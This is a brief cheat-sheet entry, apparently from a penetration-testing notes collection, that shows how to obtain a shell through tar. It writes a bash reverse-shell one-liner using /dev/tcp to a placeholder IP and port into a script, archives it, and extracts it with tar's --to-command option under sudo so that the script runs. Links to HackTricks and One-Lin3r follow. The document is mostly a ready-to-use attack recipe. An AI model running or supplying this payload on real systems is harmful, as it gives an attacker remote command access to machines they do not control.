# Tarball

```
$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > a.sh
$ tar -cvf a.tar a.sh
$ sudo -u $USER tar -xvf a.tar --to-command /bin/bash
```

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)